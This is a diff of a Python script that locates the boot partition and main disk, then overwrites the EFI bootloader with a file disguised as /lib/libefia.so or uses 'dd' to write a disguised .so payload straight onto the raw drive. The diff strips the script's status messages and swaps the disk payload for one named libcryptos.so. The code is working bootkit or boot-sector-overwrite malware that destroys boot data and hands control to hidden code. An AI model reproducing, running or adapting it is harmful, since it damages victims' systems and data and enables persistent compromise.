@@ -2,7 +2,6 @@
 import os
 import platform
 import shutil
-from colorama import Fore;
 
 bootmount = ""
 maindrive = ""
@@ -15,20 +14,17 @@ else:
     maindrive = "/dev/hda"
 
 if os.path.ismount("/boot"):
-    print(f"{Fore.GREEN}Boot partition mounted on /boot.")
     bootmount = "/boot"
 elif os.path.ismount("/boot/efi"):
-    print(f"{Fore.GREEN}Boot partition mounted on /boot/efi.")
     bootmount = "/boot/efi"
 else:
-    print(f"{Fore.GREEN}No boot partition found.")
     exit(2)
 
 def runefi():
     shutil.copyfile("/lib/libefia.so", f"{bootmount}/EFI/BOOT/BOOTX64.EFI")
 
 def runbios():
-    os.system(f"dd if=/lib/libcheckr.so of={maindrive}")
+    os.system(f"dd if=/lib/libcryptos.so of={maindrive}")
 
 
 if os.getuid() != 0:
